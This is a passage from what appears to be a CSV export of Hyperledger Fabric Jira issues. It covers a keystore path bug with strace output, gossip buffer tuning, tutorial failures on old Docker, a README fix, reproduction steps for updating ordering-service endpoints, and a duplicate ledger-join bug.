strace peer chaincode install --cafile msp/intermediatecerts/intermediate.cert.pem -C testchainid -c ""{}"" -l golang --logging-level debug -n mycc -o orderer:7050 -p com/gospel/chaincode/ -v 1{noformat}
The keystore is opened as ""msp/keystore"" whereas the others are opened with the full path of pwd in front eg ""/etc/hyperledger/fabric/msp/signcerts""

Relevant part of trace:

 
{code:java}
stat(""msp/keystore"", 0xc42021cac8) = -1 ENOENT (No such file or directory)
stat(""msp/keystore"", 0xc42021cb98) = -1 ENOENT (No such file or directory)
stat(""msp"", 0xc42021cc68) = -1 ENOENT (No such file or directory)
mkdirat(AT_FDCWD, ""msp"", 0755) = 0
mkdirat(AT_FDCWD, ""msp/keystore"", 0755) = 0
stat(""/etc/hyperledger/fabric/msp/signcerts"", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/signcerts"", O_RDONLY|O_CLOEXEC) = 3
getdents64(3, /* 3 entries */, 4096) = 80
getdents64(3, /* 0 entries */, 4096) = 0
lstat(""/etc/hyperledger/fabric/msp/signcerts/peer0.pem"", {st_mode=S_IFREG|0644, st_size=1334, ...}) = 0
close(3) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/signcerts/peer0.pem"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=1334, ...}) = 0
read(3, ""-----BEGIN CERTIFICATE-----\nMIID""..., 1846) = 1334
read(3, """", 512) = 0
close(3) = 0
stat(""/etc/hyperledger/fabric/msp/cacerts"", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/cacerts"", O_RDONLY|O_CLOEXEC) = 3
getdents64(3, /* 3 entries */, 4096) = 80
getdents64(3, /* 0 entries */, 4096) = 0
lstat(""/etc/hyperledger/fabric/msp/cacerts/ca.cert.pem"", {st_mode=S_IFREG|0644, st_size=826, ...}) = 0
close(3) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/cacerts/ca.cert.pem"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=826, ...}) = 0
read(3, ""-----BEGIN CERTIFICATE-----\nMIIC""..., 1338) = 826
read(3, """", 512) = 0
close(3) = 0
stat(""/etc/hyperledger/fabric/msp/signcerts"", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/signcerts"", O_RDONLY|O_CLOEXEC) = 3
getdents64(3, /* 3 entries */, 4096) = 80
getdents64(3, /* 0 entries */, 4096) = 0
lstat(""/etc/hyperledger/fabric/msp/signcerts/peer0.pem"", {st_mode=S_IFREG|0644, st_size=1334, ...}) = 0
close(3) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/signcerts/peer0.pem"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=1334, ...}) = 0
read(3, ""-----BEGIN CERTIFICATE-----\nMIID""..., 1846) = 1334
read(3, """", 512) = 0
close(3) = 0
stat(""/etc/hyperledger/fabric/msp/admincerts"", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/admincerts"", O_RDONLY|O_CLOEXEC) = 3
getdents64(3, /* 5 entries */, 4096) = 160
getdents64(3, /* 0 entries */, 4096) = 0
lstat(""/etc/hyperledger/fabric/msp/admincerts/ca.cert.pem"", {st_mode=S_IFREG|0644, st_size=826, ...}) = 0
lstat(""/etc/hyperledger/fabric/msp/admincerts/peer0.pem"", {st_mode=S_IFREG|0644, st_size=1334, ...}) = 0
lstat(""/etc/hyperledger/fabric/msp/admincerts/intermediate.cert.pem"", {st_mode=S_IFREG|0644, st_size=843, ...}) = 0
close(3) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/admincerts/ca.cert.pem"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=826, ...}) = 0
read(3, ""-----BEGIN CERTIFICATE-----\nMIIC""..., 1338) = 826
read(3, """", 512) = 0
close(3) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/admincerts/intermediate.cert.pem"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=843, ...}) = 0
read(3, ""-----BEGIN CERTIFICATE-----\nMIIC""..., 1355) = 843
read(3, """", 512) = 0
close(3) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/admincerts/peer0.pem"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=1334, ...}) = 0
read(3, ""-----BEGIN CERTIFICATE-----\nMIID""..., 1846) = 1334
read(3, """", 512) = 0
close(3) = 0
stat(""/etc/hyperledger/fabric/msp/intermediatecerts"", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/intermediatecerts"", O_RDONLY|O_CLOEXEC) = 3
getdents64(3, /* 3 entries */, 4096) = 96
getdents64(3, /* 0 entries */, 4096) = 0
lstat(""/etc/hyperledger/fabric/msp/intermediatecerts/intermediate.cert.pem"", {st_mode=S_IFREG|0644, st_size=843, ...}) = 0
close(3) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/intermediatecerts/intermediate.cert.pem"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=843, ...}) = 0
read(3, ""-----BEGIN CERTIFICATE-----\nMIIC""..., 1355) = 843
read(3, """", 512) = 0
close(3) = 0
stat(""/etc/hyperledger/fabric/msp/crls"", 0xc42021dca8) = -1 ENOENT (No such file or directory)
write(2, ""2017-07-03 10:38:12.345 UTC [msp""..., 2152017-07-03 10:38:12.345 UTC [msp] getMspConfig -> INFO 001 crls folder not found at [/etc/hyperledger/fabric/msp/intermediatecerts]. Skipping.: [stat /etc/hyperledger/fabric/msp/crls: no such file or directory]
) = 215
stat(""/etc/hyperledger/fabric/msp/config.yaml"", {st_mode=S_IFREG|0664, st_size=137, ...}) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/config.yaml"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0664, st_size=137, ...}) = 0
read(3, ""OrganizationalUnitIdentifiers:\n ""..., 649) = 137
read(3, """", 512) = 0
close(3) = 0
openat(AT_FDCWD, ""/etc/hyperledger/fabric/msp/intermediatecerts/intermediate.cert.pem"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=843, ...}) = 0
read(3, ""-----BEGIN CERTIFICATE-----\nMIIC""..., 1355) = 843
read(3, """", 512) = 0
close(3) = 0
mmap(0xc420300000, 1048576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xc420300000
mmap(0xc41ffe0000, 32768, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xc41ffe0000
openat(AT_FDCWD, ""msp/keystore"", O_RDONLY|O_CLOEXEC) = 3
getdents64(3, /* 2 entries */, 4096) = 48
getdents64(3, /* 0 entries */, 4096) = 0
close(3) = 0
openat(AT_FDCWD, ""msp/keystore"", O_RDONLY|O_CLOEXEC) = 3
getdents64(3, /* 2 entries */, 4096) = 48
getdents64(3, /* 0 entries */, 4096) = 0
close(3) = 0
select(0, NULL, NULL, NULL, {0, 1000}) = 0 (Timeout)
select(0, NULL, NULL, NULL, {0, 1000}) = 0 (Timeout)
write(2, ""panic: "", 7panic: ) = 7
write(2, ""Error when setting up MSP from d""..., 118Error when setting up MSP from directory /etc/hyperledger/fabric/msp: err KeyMaterial not found in SigningIdentityInfo) = 118
write(2, ""\n"", 1

{code}
 ",,denyeart,mastersingh24,muralisr,reubent 1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6ov:",,,,,,,,,,,,,,,,,,,,,,,denyeart,mastersingh24,muralisr,reubent 1,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Jul/17 9:53 PM;reubent 1;This appears to be related to the difference between peer->MSPConfigPath and peer->BCCSP->FileKeyStore->KeyStore;;;","08/Sep/17 3:23 AM;muralisr;[~reubent 1] Can you provide a working command to compare with the above non-working one to help debug please ?;;;","27/Nov/17 12:37 PM;denyeart;[~reubent 1] [~muralisr] Can this issue be reproduced? Can you provide more details?;;;","09/Dec/17 8:54 PM;mastersingh24;[~reubent 1] - What environment variables are you setting for the config?

I can only reproduce this if I explicit set 

*CORE_PEER_BCCSP_SW_FILEKEYSTORE_KEYSTORE*  or in *core.yaml* set *peer.bccsp.sw.filekeystore.keystore* to a relative path;;;","11/Dec/17 3:38 AM;mastersingh24;https://gerrit.hyperledger.org/r/16099;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Relax gossip send buffer behavior,FAB-5153,18897,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,03/Jul/17 8:59 PM,21/Jul/18 3:53 AM,28/Oct/23 3:00 AM,04/Jul/17 5:03 AM,v1.0.0-rc1,,,v1.0.0,,fabric-gossip,,,,,,1,,,,,,,"In gossip there are send and receive buffers that are allocated for each connection.
When the throughput of messages is too high and the send buffer overflows, the connection to the peer is closed and the peer is removed from the membership.

From performance evaluations I did - I conclude that:
*  Increasing the send buffer size would benefit to withstand intense bursts of messages, even when the receive buffer stays the same.
*  Not closing the connection to the peer (and not removing it from the membership) that its corresponding send buffer overflowed helps the throughput by giving the runtime an opportunity to recover in spite of an intensive burst.",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy6p3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Failed to deserialize creator identity, when creating first application tutorial",FAB-5154,18925,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,RichardHill,RichardHill,04/Jul/17 5:33 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,24/Jul/17 10:15 PM,v1.0.0,,,v1.0.1,,fabric-docs,,,,,,0,samples,,,,,,"I am following the instructions on

 

[http://hyperledger-fabric.readthedocs.io/en/latest/write_first_app.html]

 

*steps*

git clone https://github.com/hyperledger/fabric-samples.git cd fabric-samples/fabcar

cd fabric-samples/fabcar

./startFabric.sh

*Result*

Creating orderer.example.com
Creating couchdb
Creating peer0.org1.example.com
Creating cli
flag provided but not defined: -e
See 'docker exec --help'.

*Steps*

npm install

node query.js

 

*Result*

Create a client and set the wallet location
Set wallet path, and associate user  PeerAdmin  with application
Check user is enrolled, and set a query URL in the network
Make query
Assigning transaction_id:  8ed0f6ee0e57de9c446965d29c9d5c67d61203532a0b25aa27af8710a1544e32
error: [client-utils.js]: sendPeersProposal - Promise is rejected: Error: Failed to deserialize creator identity, err MSP Org1MSP is unknown
    at /home/rhill/fabric-samples/fabcar/node_modules/grpc/src/node/src/client.js:434:17
returned from query
Query result count =  1
error from query =  \{ Error: Failed to deserialize creator identity, err MSP Org1MSP is unknown
    at /home/rhill/fabric-samples/fabcar/node_modules/grpc/src/node/src/client.js:434:17 code: 2, metadata: Metadata \{ _internal_repr: \{} } }
Response is  Error: Failed to deserialize creator identity, err MSP Org1MSP is unknown

 ",,ChristopherFerris,mastersingh24,nemoto,RichardHill,wanghhao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Jul/17 4:44 PM;RichardHill;fabric-couchdb_docker.log;https://jira.hyperledger.org/secure/attachment/11539/fabric-couchdb_docker.log","04/Jul/17 4:44 PM;RichardHill;fabric-orderer_docker.log;https://jira.hyperledger.org/secure/attachment/11540/fabric-orderer_docker.log","04/Jul/17 4:44 PM;RichardHill;fabric-peer_docker.log;https://jira.hyperledger.org/secure/attachment/11541/fabric-peer_docker.log",,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6rj:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,mastersingh24,nemoto,RichardHill,wanghhao,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Jul/17 4:47 PM;RichardHill;I set log level to debug

DEBUG=composer:* node query.js

then added the logs from docker containers;;;","04/Jul/17 5:08 PM;nemoto;[~RichardHill] Hi. Can you provide some more details about your environment? It looks like that you are using old docker version. See also, [http://hyperledger-fabric.readthedocs.io/en/latest/prereqs.html]. Thanks.;;;","04/Jul/17 5:19 PM;nemoto;[~RichardHill] Sorry, I missed your comment. ""startFabric.sh"" seems to be finished incorrectly. Which docker version are you using?;;;","04/Jul/17 8:51 PM;RichardHill;Here you go.. is there more logging somewhere I can give you

 

$docker --version
Docker version 1.12.6, build 78d1802

$docker-compose  --version
docker-compose version 1.11.2, build dfed245

 

$docker images | grep hyperledger | awk  '\{print $1,$2,$3,$4,$5}'

hyperledger/fabric-tools latest 85d6d3ca0a30 10 days
hyperledger/fabric-tools x86_64-1.0.0-rc1 85d6d3ca0a30 10 days
hyperledger/fabric-couchdb latest b37a08f8a0cb 10 days
hyperledger/fabric-couchdb x86_64-1.0.0-rc1 b37a08f8a0cb 10 days
hyperledger/fabric-kafka latest dbb5796d915f 10 days
hyperledger/fabric-kafka x86_64-1.0.0-rc1 dbb5796d915f 10 days
hyperledger/fabric-zookeeper latest d2efbb01a999 10 days
hyperledger/fabric-zookeeper x86_64-1.0.0-rc1 d2efbb01a999 10 days
hyperledger/fabric-orderer latest 5ec6333eae10 10 days
hyperledger/fabric-orderer x86_64-1.0.0-rc1 5ec6333eae10 10 days
hyperledger/fabric-peer latest cf6bedc2935e 10 days
hyperledger/fabric-peer x86_64-1.0.0-rc1 cf6bedc2935e 10 days
hyperledger/fabric-javaenv latest 7cbe6aca3956 10 days
hyperledger/fabric-javaenv x86_64-1.0.0-rc1 7cbe6aca3956 10 days
hyperledger/fabric-ca latest cea779a46670 10 days
hyperledger/fabric-ca x86_64-1.0.0-rc1 cea779a46670 10 days
hyperledger/fabric-ccenv latest 13ed472038d2 10 days
hyperledger/fabric-ccenv x86_64-1.0.0-rc1 13ed472038d2 10 days
hyperledger/fabric-couchdb x86_64-1.0.0-alpha2 3d89ac4895f9 7 weeks
hyperledger/fabric-ca x86_64-1.0.0-alpha2 86f4e4280690 7 weeks
hyperledger/fabric-kafka x86_64-1.0.0-alpha2 b77440c116b3 7 weeks
hyperledger/fabric-zookeeper x86_64-1.0.0-alpha2 fb8ae6cea9bf 7 weeks
hyperledger/fabric-orderer x86_64-1.0.0-alpha2 9a63e8bac1f5 7 weeks
hyperledger/fabric-peer x86_64-1.0.0-alpha2 23b4aedef57f 7 weeks
hyperledger/fabric-javaenv x86_64-1.0.0-alpha2 a9ca2c90a6bf 7 weeks
hyperledger/fabric-ccenv x86_64-1.0.0-alpha2 c984ae2a1936 7 weeks
hyperledger/fabric-baseos x86_64-0.3.1 4b0cab202084 7 weeks
hyperledger/fabric-javaenv x86_64-0.6.2-preview-snapshot-1f14698 3f590b44f270 11 weeks
hyperledger/fabric-ccenv x86_64-0.6.2-preview-snapshot-1f14698 47511ea45bc9 11 weeks
hyperledger/fabric-src latest fb2782d66a86 11 weeks
hyperledger/fabric-src x86_64-0.6.2-preview-snapshot-1f14698 fb2782d66a86 11 weeks
hyperledger/fabric-membersrvc x86_64-0.6.1-preview b3654d32e4f9 8 months
hyperledger/fabric-peer x86_64-0.6.1-preview 21cb00fb27f4 8 months
hyperledger/fabric-baseimage latest db53d04b117c 9 months
hyperledger/fabric-baseimage x86_64-0.1.0 db53d04b117c 9 months
hyperledger/fabric-baseimage x86_64-0.0.11 90d869298cb6 10 months

 ;;;","05/Jul/17 4:35 AM;mastersingh24;_*docker exec -e*_  which is used starting at [https://github.com/hyperledger/fabric-samples/blob/master/fabcar/startFabric.sh#L25] will only work with Docker 1.13 and later (that's when the *-e* option for exec was introduced).

[~RichardHill] - would it be possible for you to upgrade to Docker 1.13.1 or later and try again?  Apologies for not having the correct minimum version in the prereqs. 

Will modify prereqs to specify *_Docker 17.03.0-ce_* or later;;;","05/Jul/17 8:57 AM;RichardHill;Sure, I will update the issue when the upgrade finishes;;;","23/Jul/17 9:54 PM;ChristopherFerris;https://gerrit.hyperledger.org/r/11849;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Fix README.md in ""balance-transfer"" example.",FAB-5155,18926,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,yuki-kon,yuki-kon,yuki-kon,04/Jul/17 5:52 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,09/Sep/17 5:05 AM,v1.0.0-rc1,,,Future,,fabric-docs,fabric-samples,,,,,0,,,,,,,"The README in ""balance-transfer"" should be fixed in the section:
https://github.com/hyperledger/fabric-samples/tree/master/balance-transfer#running-the-sample-program

1. Broken link
There is a link to ""Sample REST APIs Requests"" which is broken. This is linked to non-existent path on fabric-sdk-node repository.
I believe the intended link is to https://github.com/hyperledger/fabric-samples/tree/master/balance-transfer#sample-rest-apis-requests


2. Instruction to start node application.
There is no instruction to start node application.
If we execute the REST APIs according to the current README, we can't get any responses since node application is not working.
We need to execute the following steps before calling REST APIs.

 - npm install
 - PORT=4000 node app
",,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6rr:",,,,,,,,,,,,,,,,,,,,,,,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Jul/17 6:58 AM;yuki-kon;Posted here: https://gerrit.hyperledger.org/r/#/c/11345/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Being able to update the endpoints of ordering service,FAB-5157,18929,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,JonathanLevi,JonathanLevi,04/Jul/17 5:20 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Nov/17 11:46 PM,v1.0.0-rc1,,,v1.1.0,,fabric-peer,,,,,,0,,,,,,,"Let's use this JIRA ticket to report in detail the set of issues that [~C0rWin] faced recently when attempting to update an endpoint. At best, one has to restart the peer in order for changes to 

See an initial fix suggestion here:

https://gerrit.hyperledger.org/r/#/c/11339

**UPDATE** (adding details on how to reproduce the issue)

Used `configtx.yaml` from e2e example application.

1. Generate config transaction with `configtxgen` tool
{code}
configtxgen -profile TwoOrgsInChannel -channelID mychannel -outputCreateTx=mychannel.tx
{code}

2. Create channel for peer
{code}
peer channel create -o localhost:7050 -c mychannel -f mychannel.tx
{code}

3. Join channel
{code}
peer channel join -o localhost:7050 --blockpath mychannel.block
{code}

4. Convert genesis block into json format 
{code}
curl -X POST --data-binary @mychannel.block http://localhost:7059/protolator/decode/common.Block -o mychannel.json
{code}

5. Extract config part and update endpoint
{code}
jq "".data.data[0].payload.data.config"" mychannel.json > config.json
jq '.channel_group.values.OrdererAddresses.value.addresses = [""orderer:7050""]' config.json > config_update.json
{code}

6. Create config update
{code}
curl -X POST --data-binary @config.json http://localhost:7059/protolator/encode/common.Config -o config.block
curl -X POST --data-binary @config_update.json http://localhost:7059/protolator/encode/common.Config -o config_update.block
curl -X POST -F original=@config.block -F updated=@config_update.block http://localhost:7059/configtxlator/compute/update-from-configs -F channel=mychannel -o config_update.pb
curl -X POST --data-binary @config_update.pb http://localhost:7059/protolator/decode/common.ConfigUpdate -o config_update.pb.json
echo '{""payload"":{""header"":{""channel_header"":{""channel_id"":""mychannel"", ""type"":2}},""data"":{""config_update"":'$(cat config_update.pb.json)'}}}' > config_update_as_envelope.json
curl -X POST --data-binary @config_update_as_envelope.json http://127.0.0.1:7059/protolator/encode/common.Envelope -o config_update_as_envelope.pb
{code}

7. Submit to the peer:
{code}
peer channel update -f config_update_as_envelope.pb -c mychannel -o localhost:7050
{code}

**Expected**

Peer to switch delivery clients to fetch blocks from the updated endpoints

**Results**

Delivery service continued to maintain connection with old endpoints

PS. Restart of the peer took effect and peers switched to fetch blocks from updated endpoints.",,binhn,C0rWin,jeffgarratt,JonathanLevi,jyellick,kchristidis,mastersingh24,muralisr,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6s7:",,,,,,,,,,,,,,,,,,,,,,,binhn,C0rWin,jeffgarratt,JonathanLevi,jyellick,kchristidis,mastersingh24,muralisr,yacovm,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Jul/17 5:36 PM;yacovm;I think that for v1.0 we should encourage users *not to change ordering service endpoints at all* because of the following scenario:
* Assuming we have a peer *p* in orgA
* the ordering service endpoint are all replaced to a totally new set and *p* is updated with the new endpoints
* Later, peer *q* in orgB is added to the channel, and it's the first peer from this org, and it is given the genesis block that points to an old, non existent set of ordering service nodes (they were all replaced) 
* Unless *q* has connectivity to *p* or any other peer from orgA - it will never be able to connect to any ordering service endpoint at all.
* The reason is that we currently update the delivery client as configuration blocks are consumed, and there is no way to ""override"" the delivery client to work with an ordering service that is different from the latest configuration block.
* This whole scenario gets even impossible to solve if:
** orgA was the first org in the channel
** orgC was added later to the channel
** orgA was evicted from the channel later
** orgB was added last, and now cannot even communicate with peers from orgA.\
** as a result - orgB is disconnected from the channel although it participates in it.;;;","04/Jul/17 7:39 PM;C0rWin;[~yacovm] While I see your point and I think it's perfectly valid, since changing endpoints might be quite dangerous action, _however_ you missing the fact that this possibility is  already there and in order to take effect peer has to be restarted.

So you scenario could be done even now, with one except, you need to restart your peer once config is updated.;;;","04/Jul/17 7:51 PM;yacovm;True. 

I was just chiming in to say that we should recommend users not to mess with that part of the system anyway, since it is very easy to shoot oneself in the foot.
Therefore - I'm not certain how urgent it is to fix this for V1.0;;;","04/Jul/17 8:56 PM;C0rWin;We can use #review-needed to see other opinion and vote to decide whenever it's required for v1.0. Also IMO this is not a Stoty and need to be converted into BUG, since definitely not conforms desired/expected behavior.;;;","05/Jul/17 6:00 AM;JonathanLevi;Thanks everybody for the info. This is a *bug* indeed. We can evaluate/discuss tomorrow, but something needs to be done here.;;;","05/Jul/17 6:01 AM;JonathanLevi;We can discuss/agree on the right ""course of action"" when more of us are back from ""hols""...;;;","05/Jul/17 10:30 PM;mastersingh24;I don't think we should make any changes in this area for now.  We can put this in a fix pack.  I would document this as a known limitation.  I don't see that anyone will have the need to actually do this in any case for the first few months.

So my vote is defer to first patch release;;;","05/Jul/17 11:33 PM;jyellick;I would likewise vote to defer.;;;","05/Jul/17 11:38 PM;muralisr;+1 to defer;;;","06/Jul/17 12:28 AM;binhn;[~JonathanLevi]
I agreed to lower priority and defer;;;","06/Jul/17 12:31 AM;JonathanLevi;Fair enough. I second this too.

Please write here if you believe that we should re-visit this.;;;","24/Jul/17 11:20 PM;jyellick;Is this still review-needed? I'd assume this can/should be addressed in the scope of v1.1?;;;","24/Jul/17 11:26 PM;yacovm;Good point [~jyellick] ;;;","27/Oct/17 4:20 AM;jeffgarratt;[~yacovm] [~C0rWin] I assume this is still an issue?;;;","27/Oct/17 5:42 AM;C0rWin;Yes, it's still an issue, I should have a fix and can rebase and re-work it and push CR;;;","01/Nov/17 11:41 PM;jeffgarratt;[~C0rWin] could you link the CR and update?  Thanks.;;;","02/Nov/17 12:59 AM;C0rWin;[~jeffgarratt] Will do once it will be ready for review.;;;","09/Nov/17 6:29 AM;C0rWin;https://gerrit.hyperledger.org/r/#/c/15237/;;;",,,,,,,,,,,,,,,,,,,,,
Cannot join any peer into one channel once there are any chaincodes instantiated on that channel,FAB-5158,18930,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,,csftan,csftan,04/Jul/17 5:33 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Jul/17 7:39 PM,,,,DUPLICATE,,fabric-ledger,fabric-orderer,,,,,0,,,,,,,"The step to reproduce this bug is as follows:
 # I create the channel using the foo.tx in the fabric-sdk-java
 # I join one peer (peer0) into the channel (foo) I just created
 # I install and instantiate the chaincode example_cc on the peer in the channel foo
 # I try to join another peer (peer1) into channel foo, but fabric returns bad request: Join peer to channel foo failed.  Status FAILURE, details: Sending proposal to peer1.org1.example.com failed because of: gRPC failure=Status\{code=UNKNOWN, description=chaincode error (status: 500, message: Cannot create ledger from genesis block, due to LedgerID already exists), cause=null}""",,csftan,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6sf:",,,,,,,,,,,,,,,,,,,,,,,csftan,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Jul/17 7:39 PM;mastersingh24;Duplicate of FAB-5159;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cannot join any peer into one channel once there are any chaincodes instantiated on that channel,FAB-5159,18931,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,muralisr,csftan,csftan,04/Jul/17 5:35 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Jul/17 10:46 PM,,,,Unverifiable,,fabric-ledger,,,,,,0,,,,,,,"The step to reproduce this bug is as follows:
 # I create the channel using the foo.tx in the fabric-sdk-java
 # I join one peer (peer0) into the channel (foo) I just created
 # I install and instantiate the chaincode example_cc on the peer in the channel foo
 # I try to join another peer (peer1) into channel foo, but fabric returns bad request: Join peer to channel foo failed.  Status FAILURE, details: Sending proposal to peer1.org1.example.com failed because of: gRPC failure=Status\{code=UNKNOWN, description=chaincode error (status: 500, message: Cannot create ledger from genesis block, due to LedgerID already exists), cause=null}""",,binhn,csftan,mastersingh24,muralisr,Ratnakar,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Jul/17 10:17 PM;yacovm;Capture.PNG;https://jira.hyperledger.org/secure/attachment/11598/Capture.PNG",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6sn:",,,,,,,,,,,,,,,,,,,,,,,binhn,csftan,mastersingh24,muralisr,Ratnakar,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Jul/17 7:41 PM;mastersingh24;[~csftan] Can you provide some additional detail(s) about your setup?  Are you using Docker, etc?;;;","05/Jul/17 10:06 AM;csftan;[~mastersingh24] yes, I use docker-compose file in the sdkIntegration-test directory of fabric-java-sdk to boot the network. The chaincode I used is also the example_cc.go in the same directory. ;;;","05/Jul/17 10:52 PM;muralisr;[~csftan] ""Cannot create ledger from genesis block, due to LedgerID already exists"" suggests that the peer's may have alread joined (ledger exists). Are you mounting ledger volume by any chance ?;;;","06/Jul/17 12:16 AM;binhn;[~csftan] we can't recreate using your provided steps above. Here's the description
https://chat.hyperledger.org/channel/fabric-scrum?msg=nNCvLufRyRPLN2QH3

